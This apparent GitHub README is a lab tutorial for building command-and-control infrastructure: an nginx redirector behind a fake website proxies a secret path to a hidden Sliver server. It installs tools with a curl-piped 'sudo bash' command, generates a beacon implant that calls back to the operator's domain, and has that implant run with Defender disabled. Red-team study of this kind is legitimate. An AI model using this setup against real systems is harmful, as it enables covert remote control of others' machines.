# Simple C2 Redirector Infrastructure
Simple C2 Path Redirector with nginx to help learn the basics of C2 infrastructure.

Requirements:
* (2) Ubuntu VMs in the cloud with **at least** 1 CPU and 2 GB RAM each
* (1) Domain

<img width="772" height="366" alt="image" src="https://github.com/user-attachments/assets/25eeb7de-c954-4065-889c-ce0ad9905e93" />

# 1. Create VMs in Cloud
First create two VMS in your favorite Cloud service (AWS, Azure, etc):  
* Redir-VM - Will be exposed to the internet and serve as the *fake website* using nginx   
* C2-VM - Will be your C2 (in this case Sliver) and NOT exposed to the internet at all

These two VMs will be in the **SAME private network** with the following network configs.  
**C2-VM**:
- Create in local network private network
- NO Public IP or ports open to the Internet
- Make sure to create an SSH key for these VMs

**Redir-VM** (You can change 8443 to whatever port but change throughout future steps if you do):  
- Inbound  
   - 22 to only your IP(s)  
   - 80 to any IP  
   - 443 to any IP  
   - 8443 to any IP
- Outbound  
    - 80 to any IP  
    - 443 to any IP  
    - 8443 to any IP   

Once you get your public IP for Redir-VM, make an *A-record* DNS entry to your domain and the public IP.


# 2. Setup Redir-VM
_Perform the following commands on Redir-VM unless stated otherwise._

First lets configure the redirector which will host a fake website using nginx and when a certain path is given, it will redirect to the C2 server.
```
sudo apt update && sudo apt upgrade
sudo apt-get install -y nginx certbot net-tools
sudo systemctl stop nginx
sudo certbot certonly --register-unsafely-without-email -d <www.youdomain.com>
```
_Note: for certbot, enter [1] then [y] when prompted_
Create your fake website in _/var/www/html_ by changing _index.html_ to your own code or use the one in the repo and change the wording a bit to make sense for your domain.

Create your redirector in _/etc/nginx/sites-available_ by adding the _default_ file from the repo to replace the one there.
CHANGE _secretpath_ to something custom, make sure its random looking and long. so something like:
```
  location /ajisdfYUVSbgseoznauitrcbXBWDG {
                proxy_pass https://<C2-ip>:443;
        }
```
Start up nginx
```
sudo systemctl start nginx
```

Upload your SSH key to Redir-VM so you can connect to C2-VM through SSH  
From your host to Redir-VM:
```
scp -i <yourSSH-.pem-file> <yourSSH-.pem-file> <user>@<Redir-VM-IP>:/home/<user>/.ssh/id_rsa
```
Chmod 400 to the SSH key on Redir-VM. 
```
chmod 400 ~/.ssh/<your-private-key>
```
Copy over the same SSH key to the C2 to do reversee SSH connections in the next step  
From Redir-VM to C2-VM:
```
scp /home/<user>/.ssh/id_rsa <user>@<c2-VM-IP>:/home/<user>/.ssh/id_rsa
```

# 3. Setup C2-VM

_Perform the following commands on C2-VM unless stated otherwise. Make sure the SSH key is on C2-VM from previous step in order to perform reverse SSH connection._

Setup SSH reverse connection from C2-VM to Redir-VM in order to reach the internet and download Sliver.  
This will leave the prompt hanging so open up another terminal for the other steps or run this in tmux or screen session.
```
ssh -D 1080 -q -N <user>@<Redir-VM-PRIVATE-IP>
```
*Note: This will leave the prompt hanging so open up another terminal for the other steps or run this in tmux or screen session*

Test SSH reverse connection by using curl with socks5, it should return the IP of Redir-VM's public IP.
```
curl --socks5-hostname 127.0.0.1:1080 ifconfig.io
```
Install your C2 using socks5 (in this case Sliver).
```
curl --socks5-hostname 127.0.0.1:1080 https://sliver.sh/install|sudo bash
```

Once it finishes installed, exit or cancel the _ssh -D_ command with _Ctrl + C_ in the terminal.


# 4. Configure Your C2
Again, this will be using sliver so modify steps to your C2 and we will be using defaul configs since this is not a tutorial on bypassing EDR.
Use Sliver's latest [Wiki](https://sliver.sh/docs?name=Compile+from+Source) in case specific configs change.  

Confirm Sliver is installed (running as sudo to use HTTPS, screen is optional).
```
sudo su
screen -S sliver-session
sliver
```

Generate a beacon and start HTTPS listener.
```
generate beacon --http <yourDomain>:8443/<yourSecretRedirPath> --save yourBeacon.exe

https
```

Transfer over payload (yourBeacon.exe) to a machine an run it (Make sure Defender is turned off if using default configs).
```
On C2-VM:
chmod 777 <beacon.exe-location>

On Redir-VM: 
scp -i <SSH-key> <user>@<C2-VM-IP>:/<beacon.exe-location> .

On host to get it from Redir-VM:
scp -i <SSH-key> <user>@<Redir-VM-public-IP>:/<beacon.exe-location> .
```


